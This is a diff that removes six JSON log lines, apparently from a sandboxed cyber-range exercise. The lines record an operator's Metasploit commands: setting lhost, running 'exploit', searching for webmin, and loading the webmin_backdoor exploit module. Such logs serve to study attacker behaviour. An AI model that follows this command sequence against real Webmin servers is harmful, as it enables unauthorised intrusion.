@@ -1,6 +1,0 @@
-{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:15:44.573332+02:00", "cmd_type": "msf-command", "cmd": "set lhost 10.1.135.83"}
-{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:16:01.798856+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
-{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:17:13.753071+02:00", "cmd_type": "msf-command", "cmd": "cd /root/"}
-{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:17:44.737839+02:00", "cmd_type": "msf-command", "cmd": "search webmin"}
-{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:17:54.869708+02:00", "cmd_type": "msf-command", "cmd": "use exploit/unix/webapp/webmin_backdoor"}
-{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:18:05.770947+02:00", "cmd_type": "msf-command", "cmd": "options"}
